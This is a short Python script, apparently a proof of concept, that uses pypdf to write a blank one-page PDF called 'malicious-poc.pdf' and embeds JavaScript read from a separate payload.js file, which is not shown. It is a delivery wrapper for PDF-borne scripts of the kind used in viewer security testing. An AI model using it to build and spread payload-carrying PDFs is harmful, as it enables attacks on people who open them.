import os
from pypdf import PdfWriter

filename = "malicious-poc.pdf"
filepath = f"./out/{filename}"
os.makedirs(os.path.dirname(filepath), exist_ok=True)

payload_file = os.path.join(os.path.dirname(__file__), "payload.js")
with open(payload_file, "r") as js_file:
    payload = js_file.read()

writer = PdfWriter()
writer.add_blank_page(width=300, height=300)
writer.add_js(payload)

with open(filepath, "wb") as f:
    writer.write(f)

print(f'POC PDF created: {filename}')
